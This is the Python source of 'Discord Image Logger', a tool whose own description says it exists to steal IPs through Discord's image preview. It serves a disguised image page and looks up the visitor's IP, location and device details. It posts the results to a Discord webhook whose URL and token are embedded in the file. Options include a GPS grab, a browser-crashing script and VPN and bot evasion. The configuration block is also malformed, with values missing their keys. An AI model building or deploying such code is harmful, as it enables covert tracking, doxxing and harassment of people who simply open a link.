# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "https://discord.com/api/webhooks/1418298636600741931/zouAZkp2gFKNcsTbgyvZ-hBlD5KJjr4-UgJ8VaeAdjkQMtK3zbhqDe3vV3MaANOTITCj",
    "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
